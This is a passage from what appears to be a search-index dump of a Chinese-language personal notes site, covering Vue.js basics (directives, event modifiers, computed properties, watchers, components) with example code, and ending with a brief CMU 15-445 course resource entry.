\u4ec5\u5f53\u6309\u4e0b Ctrl \u4e14\u672a\u6309\u4efb\u4f55\u5176\u4ed6\u952e\u65f6\u624d\u4f1a\u89e6\u53d1 --&gt; \n&lt;button @click.ctrl.exact=\"onCtrlClick\"&gt;A&lt;/button&gt;\n</code></pre> <p>Vue \u4e3a <code>v-on</code> \u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u4e8b\u4ef6\u4fee\u9970\u7b26\uff0c\u5305\u542b\uff1a</p> <ul> <li><code>.stop</code></li> <li><code>.prevent</code></li> <li><code>.self</code></li> <li><code>.capture</code></li> <li><code>.once</code></li> <li><code>.capture</code></li> </ul> <pre><code>&lt;!-- \u5355\u51fb\u4e8b\u4ef6\u5c06\u505c\u6b62\u4f20\u9012 --&gt;\n&lt;a @click.stop=\"doThis\"&gt;&lt;/a&gt;\n\n&lt;!-- \u63d0\u4ea4\u4e8b\u4ef6\u5c06\u4e0d\u518d\u91cd\u65b0\u52a0\u8f7d\u9875\u9762 --&gt;\n&lt;form @submit.prevent=\"onSubmit\"&gt;&lt;/form&gt;\n\n&lt;!-- \u4fee\u9970\u8bed\u53ef\u4ee5\u4f7f\u7528\u94fe\u5f0f\u4e66\u5199 --&gt;\n&lt;a @click.stop.prevent=\"doThat\"&gt;&lt;/a&gt;\n\n&lt;!-- \u4e5f\u53ef\u4ee5\u53ea\u6709\u4fee\u9970\u7b26 --&gt;\n&lt;form @submit.prevent&gt;&lt;/form&gt;\n\n&lt;!-- \u4ec5\u5f53 event.target \u662f\u5143\u7d20\u672c\u8eab\u65f6\u624d\u4f1a\u89e6\u53d1\u4e8b\u4ef6\u5904\u7406\u5668 --&gt;\n&lt;!-- \u4f8b\u5982\uff1a\u4e8b\u4ef6\u5904\u7406\u5668\u4e0d\u6765\u81ea\u5b50\u5143\u7d20 --&gt;\n&lt;div @click.self=\"doThat\"&gt;...&lt;/div&gt;\n\n&lt;!-- \u6dfb\u52a0\u4e8b\u4ef6\u76d1\u542c\u5668\u65f6\uff0c\u4f7f\u7528 `capture` \u6355\u83b7\u6a21\u5f0f --&gt;\n&lt;!-- \u4f8b\u5982\uff1a\u6307\u5411\u5185\u90e8\u5143\u7d20\u7684\u4e8b\u4ef6\uff0c\u5728\u88ab\u5185\u90e8\u5143\u7d20\u5904\u7406\u524d\uff0c\u5148\u88ab\u5916\u90e8\u5904\u7406 --&gt;\n&lt;div @click.capture=\"doThis\"&gt;...&lt;/div&gt;\n\n&lt;!-- \u70b9\u51fb\u4e8b\u4ef6\u6700\u591a\u88ab\u89e6\u53d1\u4e00\u6b21 --&gt;\n&lt;a @click.once=\"doThis\"&gt;&lt;/a&gt;\n\n&lt;!-- \u6eda\u52a8\u4e8b\u4ef6\u7684\u9ed8\u8ba4\u884c\u4e3a (scrolling) \u5c06\u7acb\u5373\u53d1\u751f\u800c\u975e\u7b49\u5f85 `onScroll` \u5b8c\u6210 --&gt;\n&lt;!-- \u4ee5\u9632\u5176\u4e2d\u5305\u542b `event.preventDefault()` --&gt;\n&lt;!-- \u6539\u5584\u79fb\u52a8\u7aef\u6ed1\u5c4f\u6027\u80fd --&gt;\n&lt;div @scroll.passive=\"onScroll\"&gt;...&lt;/div&gt;\n</code></pre> <p>v-if &amp; v-else</p> <p>\u8fd9\u4e24\u4e2a\u5c5e\u6027\u63a7\u5236\u4e00\u4e2a\u5143\u7d20\u662f\u5426\u663e\u793a\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;button @click=\"seen = !seen\"&gt;Toggle&lt;/button&gt;\n\n&lt;p v-if=\"seen\"&gt;Now you see me&lt;/p&gt;\n&lt;p v-else&gt;Oh no \ud83d\ude22&lt;/p&gt;\n</code></pre> <p><code>v-else</code> \u5fc5\u987b\u8ddf\u5728 <code>v-if</code> \u6216 <code>v-else-if</code> \u540e\u9762</p> <p>v-show</p> <p>\u53e6\u4e00\u4e2a\u7528\u6765\u6309\u6761\u4ef6\u663e\u793a\u7684\u6307\u4ee4\u662f <code>v-show</code>\uff0c\u5176\u57fa\u672c\u7528\u6cd5\u548c <code>v-if</code> \u76f8\u540c\uff1a</p> <pre><code>&lt;h1 v-show=\"ok\"&gt;Hello!&lt;/h1&gt;\n</code></pre> <p>\u533a\u522b\u5728\u4e8e\uff0c<code>v-show</code> \u4ec5\u5207\u6362\u4e86 <code>display</code> \u7684 CSS \u5c5e\u6027\uff0c\u5e76\u4e14\u4e0d\u652f\u6301\u52a0\u5728 <code>&lt;template&gt;</code> \u4e0a\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c<code>v-if</code> \u6709\u66f4\u9ad8\u7684\u5207\u6362\u5f00\u9500\uff0c\u800c <code>v-show</code> \u6709\u66f4\u9ad8\u7684\u521d\u59cb\u6e32\u67d3\u5f00\u9500\uff0c\u9700\u8981\u6839\u636e\u9700\u6c42\u6765\u9009\u62e9\u54ea\u4e2a\u6761\u4ef6\u6e32\u67d3\u3002</p> <p>v-for</p> <p><code>v-for</code> \u6307\u4ee4\u57fa\u4e8e\u4e00\u4e2a\u6570\u7ec4\u6765\u6e32\u67d3\u4e00\u4e2a\u5217\u8868\uff0c\u9700\u8981\u7528\u5230 <code>item in items</code> \u7684\u7279\u6b8a\u8bed\u6cd5\u3002</p> <pre><code>data() {\n  return {\n    parentMessage: 'Parent',\n    items: [{ message: 'Foo' }, { message: 'Bar' }]\n  }\n}\n</code></pre> <pre><code>&lt;li v-for=\"(item, index) in items\"&gt;\n  {{ parentMessage }} - {{ index }} - {{ item.message }}\n&lt;/li&gt;\n</code></pre> <p>\u6e32\u67d3\u7ed3\u679c\u5982\u4e0b\uff1a</p> <ul> <li>Parent - 0 - Foo</li> <li>Parent - 1 - Bar</li> </ul> <p>\u4f7f\u7528 <code>value</code>, <code>key</code>, <code>index</code> \u4e09\u4e2a\u5173\u952e\u5b57\u904d\u5386\u4e00\u4e2a\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\uff1a</p> <pre><code>data() {\n  return {\n    myObject: {\n      title: 'How to do lists in Vue',\n      author: 'Jane Doe',\n      publishedAt: '2016-04-10'\n    }\n  }\n}\n</code></pre> <pre><code>&lt;li v-for=\"(value, key, index) in myObject\"&gt;\n  {{ index }}. {{ key }}: {{ value }}\n&lt;/li&gt;\n</code></pre> <p>\u5982\u679c <code>v-for</code> \u548c <code>v-if</code> \u540c\u65f6\u5b58\u5728\u4e00\u4e2a\u5143\u7d20\u4e0a\u65f6\uff0c<code>v-if</code> \u7684\u4f18\u5148\u7ea7\u66f4\u9ad8\u3002\u8fd9\u4e5f\u610f\u5473\u7740 <code>v-if</code> \u65e0\u6cd5\u8bbf\u95ee\u5230 <code>v-for</code> \u4f5c\u7528\u57df\u91cc\u5b9a\u4e49\u7684\u53d8\u91cf\u522b\u540d\u3002\u63a8\u8350\u5b9e\u8df5\u4e3a\u5728\u5916\u9762\u5305\u88c5\u4e00\u5c42 <code>&lt;template v-for=''&gt;</code>\uff1a</p> <pre><code>&lt;!-- \u6839\u636e name \u5c5e\u6027\u6392\u5e8f\u6e32\u67d3 --&gt;\n&lt;template v-for=\"todo in todos\" :key=\"todo.name\"&gt;\n  &lt;li v-if=\"!todo.isComplete\"&gt;\n    {{ todo.name }}\n  &lt;/li&gt;\n&lt;/template&gt;\n</code></pre> <p>v-model</p> <p><code>v-model</code> \u7b80\u5316\u4e86\u63a5\u503c\u7ed1\u5b9a\u548c\u4e8b\u4ef6\u76d1\u542c\uff0c\u5e76\u4e14\u652f\u6301\u5404\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u8f93\u5165\u3002</p> <pre><code>&lt;!-- \u5355\u884c\u6587\u672c\u76f4\u63a5\u7528 input --&gt;\n&lt;p&gt;Message is: {{ message }}&lt;/p&gt;\n&lt;input v-model=\"message\" placeholder=\"edit me\" /&gt;\n\n\n&lt;!-- \u591a\u884c\u6587\u672c\u7528 textarea --&gt;\n&lt;span&gt;Multiline message is:&lt;/span&gt;\n&lt;p style=\"white-space: pre-line;\"&gt;{{ message }}&lt;/p&gt;\n&lt;textarea v-model=\"message\" placeholder=\"add multiple lines\"&gt;&lt;/textarea&gt;\n</code></pre> <p>\u5355\u4e2a\u7b80\u5355\u9009\u62e9\u5668\uff1a</p> <pre><code>&lt;div&gt;Selected: {{ selected }}&lt;/div&gt;\n\n&lt;select v-model=\"selected\"&gt;\n  &lt;option disabled value=\"\"&gt;Please select one&lt;/option&gt;\n  &lt;option&gt;A&lt;/option&gt;\n  &lt;option&gt;B&lt;/option&gt;\n  &lt;option&gt;C&lt;/option&gt;\n&lt;/select&gt;\n</code></pre> <p>radio\uff1a\u5355\u9009\u6309\u94ae\uff0ccheckbox\uff1a\u590d\u9009\u6846\uff0cselect\uff1a\u9009\u62e9\u5668</p> <p><code>v-model</code> \u7684\u4fee\u9970\u7b26\u3002</p>"},{"location":"Accumulation/Vue.js/#script","title":"Script","text":"<p>\u5728\u9009\u9879\u5f0f API \u4e2d\uff0c\u6211\u4eec\u7528 <code>data</code> \u58f0\u660e\u7ec4\u4ef6\u7684\u54cd\u5e94\u5f0f\u72b6\u6001\uff0c\u5b83\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\u7684\u51fd\u6570\u3002Vue \u5728\u521b\u5efa\u65b0\u7ec4\u4ef6\u5b9e\u4f8b\u65f6\u8c03\u7528\u6b64\u51fd\u6570\uff0c\u6b64\u5bf9\u8c61\u7684\u6240\u6709\u9876\u5c42\u5c5e\u6027\u90fd\u4f1a\u88ab\u4ee3\u7406\u5230\u7ec4\u4ef6\u5b9e\u4f8b\u4e0a\uff08\u5373\u65b9\u6cd5\u4e2d\u7684 <code>this</code> \u4e0a\uff09\u3002</p> <p>\u56e0\u6b64\uff0c\u5bf9\u4e8e\u7ec4\u4ef6\u5b9e\u4f8b\u4e2d\u9700\u8981\u7528\u5230\u7684\u54cd\u5e94\u5f0f\u53d8\u91cf\uff0c\u90fd\u5e94\u5728 <code>data</code> \u4e2d\u8fdb\u884c\u521d\u59cb\u5316\uff0c\u82e5\u6240\u9700\u7684\u503c\u8fd8\u672a\u51c6\u5907\u597d\uff0c\u5219\u7528 <code>null</code>, <code>undefined</code> \u7b49\u503c\u5360\u4f4d\u3002</p> <pre><code>export default {\n  data() {\n    return {\n      count: 1\n    }\n  },\n\n  methods: {\n    increment() {\n      this.count++\n    }\n  },\n\n  mounted() {\n    // `this` \u6307\u5411\u5f53\u524d\u7ec4\u4ef6\u5b9e\u4f8b\n    console.log(this.count) // =&gt; 1\n\n    this.increment()  // count++\n\n    this.count = 2\n  }\n}\n</code></pre> <p>Vue \u5185\u7f6e API \u4f7f\u7528 <code>$</code> \u4e3a\u524d\u7f00\uff0c\u540c\u65f6\u4e3a\u5185\u90e8\u5c5e\u6027\u4fdd\u7559 <code>_</code> \u524d\u7f00\uff0c\u6211\u4eec\u8981\u907f\u514d\u4f7f\u7528\u8fd9\u4e24\u4e2a\u524d\u7f00\u547d\u540d\u7684\u5c5e\u6027</p> <p>TBD\uff1a\u7bad\u5934\u51fd\u6570</p>"},{"location":"Accumulation/Vue.js/#_2","title":"\u57fa\u7840\u8bdd\u9898","text":""},{"location":"Accumulation/Vue.js/#_3","title":"\u52a8\u6001\u53c2\u6570\u4e0e\u8ba1\u7b97\u5c5e\u6027","text":"<p>\u5bf9\u4e8e\u6307\u4ee4\u7684\u53c2\u6570\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u4e00\u4e2a JavaScript \u8868\u8fbe\u5f0f\u4f5c\u4e3a\u52a8\u6001\u53c2\u6570\uff0c\u9700\u8981\u5c06\u5176\u5305\u542b\u5728\u4e00\u5bf9\u65b9\u62ec\u53f7\u5185\uff1a</p> <pre><code>&lt;!-- v-bind --&gt;\n&lt;a v-bind:[attributeName]=\"url\"&gt; ... &lt;/a&gt;\n\n&lt;!-- \u7b80\u5199 --&gt;\n&lt;a :[attributeName]=\"url\"&gt; ... &lt;/a&gt;\n\n&lt;!-- v-on --&gt;\n&lt;a v-on:[eventName]=\"doSomething\"&gt; ... &lt;/a&gt;\n\n&lt;!-- \u7b80\u5199 --&gt;\n&lt;a @[eventName]=\"doSomething\"&gt; ... &lt;/a&gt;\n</code></pre> <p>\u4f46\u9700\u8981\u6ce8\u610f\uff0c\u52a8\u6001\u53c2\u6570\u8bed\u6cd5\u5b58\u5728\u4e00\u4e9b\u9650\u5236\uff0c\u4e0d\u80fd\u4f7f\u7528\u7a7a\u683c\u3001\u5f15\u53f7\u7b49\uff1a</p> <pre><code>&lt;!-- \u8fd9\u4f1a\u89e6\u53d1\u4e00\u4e2a\u7f16\u8bd1\u5668\u8b66\u544a --&gt;\n&lt;a :['foo' + bar]=\"value\"&gt; ... &lt;/a&gt;\n</code></pre> <p>\u5982\u679c\u6211\u4eec\u60f3\u4f20\u5165\u590d\u6742\u7684\u52a8\u6001\u5c5e\u6027\uff0c\u63a8\u8350\u4f7f\u7528\u8ba1\u7b97\u5c5e\u6027\u6765\u66ff\u6362\u590d\u6742\u7684\u8868\u8fbe\u5f0f\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;!-- In HTML --&gt;\n&lt;p&gt;Has published books:&lt;/p&gt;\n&lt;span&gt;{{ publishedBooksMessage }}&lt;/span&gt;\n</code></pre> <pre><code>export default {\n  data() {\n    return {\n      author: {\n        name: 'John Doe',\n        books: [\n          'Vue 2 - Advanced Guide',\n          'Vue 3 - Basic Guide',\n          'Vue 4 - The Mystery'\n        ]\n      }\n    }\n  },\n\n  /* \u653e\u5728 methods \u4e2d\u4f5c\u4e3a\u65b9\u6cd5\uff0c\u4e5f\u80fd\u5f97\u5230\u540c\u6837\u7684\u6548\u679c\n  * \u533a\u522b\u5728\u4e8e\uff0c\u8ba1\u7b97\u5c5e\u6027\u4f1a\u88ab\u7f13\u5b58\uff0c\u53ea\u6709\u5176\u54cd\u5e94\u5f0f\u4f9d\u8d56\u66f4\u65b0\u65f6\u624d\u91cd\u65b0\u8ba1\u7b97\n  * \u800c\u65b9\u6cd5\u5219\u5728\u6bcf\u6b21\u8c03\u7528 getter \u4e2d\u90fd\u91cd\u590d\u8ba1\u7b97\n  */\n  computed: {\n    // \u4e00\u4e2a\u8ba1\u7b97\u5c5e\u6027\u7684 getter\n    publishedBooksMessage() {\n      // `this` \u6307\u5411\u5f53\u524d\u7ec4\u4ef6\u5b9e\u4f8b\n      return this.author.books.length &gt; 0 ? 'Yes' : 'No'\n    }\n  }\n}\n</code></pre> \u8ba1\u7b97\u5c5e\u6027\u9ed8\u8ba4\u53ea\u8bfb\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e2a setter \u6765\u4f7f\u5176\u53ef\u5199 <pre><code>export default {\n  data() {\n    return {\n      firstName: 'John',\n      lastName: 'Doe'\n    }\n  },\n  computed: {\n    fullName: {\n      // getter\n      get() {\n        return this.firstName + ' ' + this.lastName\n      },\n      // setter\n      set(newValue) {\n        // \u6ce8\u610f\uff1a\u6211\u4eec\u8fd9\u91cc\u4f7f\u7528\u7684\u662f\u89e3\u6784\u8d4b\u503c\u8bed\u6cd5\n        [this.firstName, this.lastName] = newValue.split(' ')\n      }\n    }\n  }\n}\n</code></pre>"},{"location":"Accumulation/Vue.js/#class","title":"\u52a8\u6001 Class","text":"<p><code>v-bind</code> \u7684\u4e00\u4e2a\u5e38\u7528\u573a\u666f\u662f\u64cd\u7eb5\u5143\u7d20\u7684 class \u548c style\uff0c\u5b83\u4eec\u90fd\u662f attribute\uff0c\u56e0\u6b64\u90fd\u53ef\u4ee5\u548c\u52a8\u6001\u5b57\u7b26\u4e32\u7ed1\u5b9a\u3002Vue \u8fd8\u4e3a class \u548c style \u63d0\u4f9b\u4e13\u5c5e\u7684\u529f\u80fd\u589e\u5f3a\u3002</p> <p><code>v-bind:class</code> \u53ef\u4ee5\u4e0e\u4e00\u822c\u7684 <code>class</code> \u5171\u5b58\uff0c\u4e14\u53ef\u4ee5\u901a\u8fc7\u4f20\u9012\u5bf9\u8c61\u6765\u5207\u6362\u503c\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u5178\u578b\u6848\u4f8b\uff1a</p> <pre><code>data() {\n  return {\n    isActive: true,\n    hasError: true\n  }\n}\n</code></pre> <pre><code>&lt;div\n  class=\"static\"\n  :class=\"{ active: isActive, 'text-danger': hasError }\"\n&gt;&lt;/div&gt;\n</code></pre> <p>\u6e32\u67d3\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>&lt;div class=\"static active text-danger\"&gt;&lt;/div&gt;\n</code></pre> <p>\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u76f4\u63a5\u4e3a <code>class</code> \u7ed1\u5b9a\u4e00\u4e2a\u5bf9\u8c61\u6216\u8ba1\u7b97\u5c5e\u6027\uff1a</p> <pre><code>// \u5bf9\u8c61 ver\ndata() {\n  return {\n    classObject: {\n      active: true,\n      'text-danger': false\n    }\n  }\n}\n\n// \u8ba1\u7b97\u5c5e\u6027 ver\ndata() {\n  return {\n    isActive: true,\n    error: null\n  }\n},\ncomputed: {\n  classObject() {\n    return {\n      active: this.isActive &amp;&amp; !this.error,\n      'text-danger': this.error &amp;&amp; this.error.type === 'fatal'\n    }\n  }\n}\n</code></pre> <pre><code>&lt;div :class=\"classObject\"&gt;&lt;/div&gt;\n\n&lt;!-- \u6e32\u67d3\u7ed3\u679c --&gt;\n&lt;div class=\"active\"&gt;&lt;/div&gt;\n</code></pre> <p><code>style</code> \u4e5f\u662f\u540c\u7406\u3002</p>"},{"location":"Accumulation/Vue.js/#_4","title":"\u54cd\u5e94\u5f0f\u57fa\u7840","text":"<p>Vue \u9ed8\u8ba4\u60c5\u51b5\u91c7\u7528\u6df1\u5ea6\u54cd\u5e94\u72b6\u6001\uff0c\u5373\u5728\u65b9\u6cd5\u6216\u8005\u5176\u5b83\u5730\u65b9\u5bf9\u5bf9\u8c61\u8fdb\u884c\u4fee\u6539\u65f6\uff0c\u8be5\u53d8\u5316\u4f1a\u88ab\u7acb\u5373\u68c0\u6d4b\u5230\u5e76\u5e94\u7528\u3002</p> <p>\u4e00\u79cd\u522b\u7684\u72b6\u6001\u4f7f\u7528 <code>nextTick()</code> API\uff0c\u5728 next Tick \u66f4\u65b0\u5468\u671f\u4e2d\u7684\u6240\u6709\u4fee\u6539\u4f1a\u88ab\u7f13\u5b58\uff0c\u7b49\u5230\u65f6\u949f\u6539\u53d8\u65f6\u518d\u8fdb\u884c\u66f4\u65b0\uff0c\u8fd9\u786e\u4fdd\u4e86\u4e0d\u7ba1\u8fdb\u884c\u591a\u6b21\u4fee\u6539\uff0c\u6bcf\u4e2a\u7ec4\u4ef6\u90fd\u53ea\u4f1a\u88ab\u66f4\u65b0\u4e00\u6b21\uff1a</p> <pre><code>import { nextTick } from 'vue'\n\nexport default {\n  methods: {\n    async increment() {\n      this.count++\n      await nextTick()\n      // \u73b0\u5728 DOM \u5df2\u7ecf\u66f4\u65b0\u4e86\n    }\n  }\n}\n</code></pre> <p>\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u53ef\u80fd\u9700\u8981\u52a8\u6001\u521b\u5efa\u4e00\u4e2a\u65b9\u6cd5\uff0c\u4f8b\u5982\u521b\u5efa\u4e00\u4e2a\u70b9\u51fb\u9632\u6296\u7684\u65f6\u95f4\u5904\u7406\u5668\u3002\u7531\u4e8e\u4e00\u4e2a\u65b9\u6cd5\u53ef\u80fd\u5bf9\u591a\u4e2a\u5b9e\u4f8b\u5171\u4eab\u4e00\u4e2a\u72b6\u6001\uff0c\u90a3\u4e48\u5b83\u4eec\u4e4b\u95f4\u53ef\u80fd\u5b58\u5728\u76f8\u4e92\u5f71\u54cd\u3002\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u60c5\u51b5\uff0c\u53ef\u4ee5\u5728 <code>created</code> \u751f\u547d\u5468\u671f\u94a9\u5b50\u4e2d\u4e3a\u6bcf\u4e2a\u5b9e\u4f8b\u90fd\u521b\u5efa\uff1a</p> <pre><code>export default {\n  created() {\n    // \u6bcf\u4e2a\u5b9e\u4f8b\u90fd\u6709\u4e86\u81ea\u5df1\u7684\u9884\u7f6e\u9632\u6296\u7684\u5904\u7406\u51fd\u6570\n    this.debouncedClick = _.debounce(this.click, 500)\n  },\n  unmounted() {\n    // \u6700\u597d\u662f\u5728\u7ec4\u4ef6\u5378\u8f7d\u65f6\n    // \u6e05\u9664\u6389\u9632\u6296\u8ba1\u65f6\u5668\n    this.debouncedClick.cancel()\n  },\n  methods: {\n    click() {\n      // ... \u5bf9\u70b9\u51fb\u7684\u54cd\u5e94 ...\n    }\n  }\n}\n</code></pre>"},{"location":"Accumulation/Vue.js/#_5","title":"\u4fa6\u542c\u5668","text":"<p>\u4fa6\u542c\u5668\u7c7b\u4f3c\u4e8e\u6570\u636e\u5e93\u7684\u89e6\u53d1\u5668\uff0c\u4e00\u822c\u4ee5\u6211\u4eec\u9700\u8981\u4fa6\u542c\u53d8\u91cf\u4f5c\u4e3a\u540d\u5b57\uff0c\u5728\u9009\u9879\u5f0fAPI\u4e2d\u4f7f\u7528 <code>watch</code> \u9009\u9879\uff1a</p> <pre><code>export default {\n  data() {\n    return {\n      question: '',\n      answer: 'Questions usually contain a question mark. ;-)',\n      loading: false\n    }\n  },\n  watch: {\n    // \u6bcf\u5f53 question \u6539\u53d8\u65f6\uff0c\u8fd9\u4e2a\u51fd\u6570\u5c31\u4f1a\u6267\u884c\n    question(newQuestion, oldQuestion) {\n      if (newQuestion.includes('?')) {\n        this.getAnswer()\n      }\n    }\n  },\n  methods: {\n    async getAnswer() {\n      this.loading = true\n      this.answer = 'Thinking...'\n      try {\n        const res = await fetch('https://yesno.wtf/api')\n        this.answer = (await res.json()).answer\n      } catch (error) {\n        this.answer = 'Error! Could not reach the API. ' + error\n      } finally {\n        this.loading = false\n      }\n    }\n  }\n}\n</code></pre> <p>\u4fa6\u542c\u5668\u9ed8\u8ba4\u65f6\u6d45\u5c42\u7684\uff0c\u5373\u5bf9\u4e8e\u5d4c\u5957\u5bf9\u8c61\uff08\u4f8b\u5982\u6570\u7ec4\uff09\uff0c\u5728\u5176\u5d4c\u5957\u5c5e\u6027\u88ab\u6539\u53d8\u65f6\u4e0d\u4f1a\u89e6\u53d1\u4fa6\u542c\u5668\u3002\u5982\u679c\u60f3\u8981\u589e\u52a0\u4fa6\u542c\u7684\u5c42\u6570\uff0c\u5219\u9700\u8981\u4f7f\u7528 <code>deep</code> \u53c2\u6570\uff1a</p> <pre><code>export default {\n  watch: {\n    someObject: {\n      handler(newValue, oldValue) {\n        // \u6ce8\u610f\uff1a\u5728\u5d4c\u5957\u7684\u53d8\u66f4\u4e2d\uff0c\n        // \u53ea\u8981\u6ca1\u6709\u66ff\u6362\u5bf9\u8c61\u672c\u8eab\uff0c\n        // \u90a3\u4e48\u8fd9\u91cc\u7684 `newValue` \u548c `oldValue` \u76f8\u540c\n      },\n      deep: 2\n    }\n  }\n}\n</code></pre> <p><code>deep</code> \u8bbe\u4e3a true \u7684\u65f6\u5019\u8868\u793a\u4fa6\u542c\u6240\u6709\u5d4c\u5957\u53d8\u66f4\uff0c\u5f53\u7528\u4e8e\u5927\u578b\u6570\u636e\u7ed3\u6784\u65f6\u5f80\u5f80\u5e26\u6765\u5de8\u5927\u5f00\u9500\uff0c\u8981\u6ce8\u610f\u8bbe\u7f6e</p>"},{"location":"Accumulation/Vue.js/#_6","title":"\u7ec4\u4ef6","text":"<p>\u5047\u8bbe\u6211\u4eec\u5199\u4e86\u4e00\u4e2a\u8868\u793a Blog \u6587\u7ae0\u7684\u7ec4\u4ef6 BlogPost.vue\uff0c\u5728\u6211\u4eec\u7684\u535a\u5ba2\u4e0a\uff0c\u6211\u4eec\u9700\u8981\u91cd\u590d\u6e32\u67d3\u8fd9\u4e2a\u7ec4\u4ef6\uff0c\u4f46\u662f\u5176\u5185\u5bb9\u548c\u6807\u9898\u662f\u4e0d\u4e00\u6837\u7684\u3002\u8981\u5b9e\u73b0\u8fd9\u6837\u7684\u6548\u679c\u9700\u8981\u4f7f\u7528 <code>props</code> \u9009\u9879\uff1a</p> <pre><code>&lt;!-- BlogPost.vue --&gt;\n&lt;script&gt;\nexport default {\n  props: ['title'],\n  emits: ['enlarge-text']\n}\n&lt;/script&gt;\n\n&lt;template&gt;\n  &lt;div class=\"blog-post\"&gt;\n      &lt;h4&gt;{{ title }}&lt;/h4&gt;\n      &lt;button @click=\"$emit('enlarge-text')\"&gt;Enlarge text&lt;/button&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n</code></pre> <pre><code>&lt;!-- App.vue --&gt;\n&lt;script&gt;\nimport BlogPost from './BlogPost.vue'\n\nexport default {\n  components: {\n    BlogPost\n  },\n  data() {\n    return {\n      posts: [\n        { id: 1, title: 'My journey with Vue' },\n        { id: 2, title: 'Blogging with Vue' },\n        { id: 3, title: 'Why Vue is so fun' }\n      ],\n      postFontSize: 1\n    }\n  }\n}\n&lt;/script&gt;\n\n&lt;template&gt;\n  &lt;div :style=\"{ fontSize: postFontSize + 'em' }\"&gt;\n    &lt;BlogPost\n      v-for=\"post in posts\"\n      :key=\"post.id\"\n      :title=\"post.title\"\n      @enlarge-text=\"postFontSize += 0.1\"\n    &gt;&lt;/BlogPost&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n</code></pre> <p>\u9664\u6b64\u4e4b\u5916\uff0c\u5b83\u8fd8\u901a\u8fc7\u5185\u7f6e\u7684 <code>$emit</code> \u65b9\u6cd5\u6765\u629b\u51fa\u4e00\u4e2a\u4e8b\u4ef6\uff0c\u5b9e\u73b0\u4e86\u4e00\u4e2a\u53ef\u4ee5\u589e\u52a0\u535a\u5ba2\u6587\u7ae0\u5b57\u4f53\u5927\u5c0f\u7684\u6309\u94ae\u3002\u4e0a\u8ff0\u4ee3\u7801\u53ef\u4ee5\u5728\u6f14\u7ec3\u573a\u8fdb\u884c\u8c03\u8bd5\u3002</p> <p>\u6709\u4e9b\u573a\u666f\u53ef\u80fd\u9700\u8981\u7ec4\u4ef6\u52a8\u6001\u5207\u6362\uff0c\u4f8b\u5982\u70b9\u51fb\u6309\u94ae\u5207\u6362\u4e0d\u540c\u7684\u7ec4\u4ef6\u663e\u793a\uff0c\u6b64\u65f6\u9700\u8981\u7528\u5230 Vue \u7684 <code>&lt;component&gt;</code> \u5143\u7d20\u548c <code>is</code> Attribute\uff1a</p> <pre><code>&lt;script&gt;\nimport Home from './Home.vue'\nimport Posts from './Posts.vue'\nimport Archive from './Archive.vue'\n\nexport default {\n  components: {\n    Home,\n    Posts,\n    Archive\n  },\n  data() {\n    return {\n      currentTab: 'Home',\n      tabs: ['Home', 'Posts', 'Archive']\n    }\n  }\n}\n&lt;/script&gt;\n\n&lt;template&gt;\n  &lt;div class=\"demo\"&gt;\n    &lt;button\n       v-for=\"tab in tabs\"\n       :key=\"tab\"\n       :class=\"['tab-button', { active: currentTab === tab }]\"\n       @click=\"currentTab = tab\"\n     &gt;\n      {{ tab }}\n    &lt;/button&gt;\n      &lt;component :is=\"currentTab\" class=\"tab\"&gt;&lt;/component&gt;\n  &lt;/div&gt;\n&lt;/template&gt;\n</code></pre> <p>\u88ab\u5207\u6362\u7684\u7ec4\u4ef6\u4f1a\u88ab\u5378\u8f7d\uff0c\u53ef\u4ee5\u901a\u8fc7 KeepAlive \u6765\u5f3a\u5236\u4fdd\u6301\u201c\u5b58\u6d3b\u201d\u72b6\u6001</p> <p><code>is</code> \u5c5e\u6027\u8fd8\u53ef\u4ee5\u7528\u6765\u907f\u514d\u5143\u7d20\u4f4d\u7f6e\u7684\u9650\u5236\uff0c\u4f8b\u5982\u00a0<code>&lt;ul&gt;</code>\uff0c<code>&lt;ol&gt;</code>\uff0c<code>&lt;table&gt;</code>\u00a0\u548c\u00a0<code>&lt;select&gt;</code>\uff0c\u76f8\u5e94\u7684\uff0c\u67d0\u4e9b\u5143\u7d20\u4ec5\u5728\u653e\u7f6e\u4e8e\u7279\u5b9a\u5143\u7d20\u4e2d\u65f6\u624d\u4f1a\u663e\u793a\uff0c\u4f8b\u5982\u00a0<code>&lt;li&gt;</code>\uff0c<code>&lt;tr&gt;</code>\u00a0\u548c\u00a0<code>&lt;option&gt;</code>\u3002</p> <p>\u8fd9\u4f7f\u5f97\u76f4\u63a5\u4f7f\u7528\u7ec4\u4ef6\u4f1a\u51fa\u73b0\u95ee\u9898\uff0c\u4f8b\u5982\uff1a</p> <pre><code>&lt;table&gt;\n  &lt;blog-post-row&gt;&lt;/blog-post-row&gt;\n&lt;/table&gt;\n</code></pre> <p>\u81ea\u5b9a\u4e49\u7ec4\u4ef6 <code>blog-post-row</code> \u5c06\u4f5c\u4e3a\u65e0\u6548\u5185\u5bb9\u88ab\u5ffd\u7565\u3002\u56e0\u6b64\u6211\u4eec\u4f7f\u7528\uff1a</p> <pre><code>&lt;table&gt;\n  &lt;tr is=\"vue:blog-post-row\"&gt;&lt;/tr&gt;\n&lt;/table&gt;\n</code></pre> <p>https://cn.vuejs.org/guide/components/registration.html</p>"},{"location":"Accumulation/CMU15-445/","title":"CMU 15-445 Database System","text":""},{"location":"Accumulation/CMU15-445/#cmu-15-445-database-system","title":"CMU 15-445 Database System","text":"<p> \u7ea6 48 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/#_1","title":"\u8bfe\u7a0b\u8d44\u6e90","text":"<ul> <li>Fall 2022</li> <li>\u673a\u7ffb\u4e2d\u82f1\u5b57\u5e55\u89c6\u9891</li> </ul> 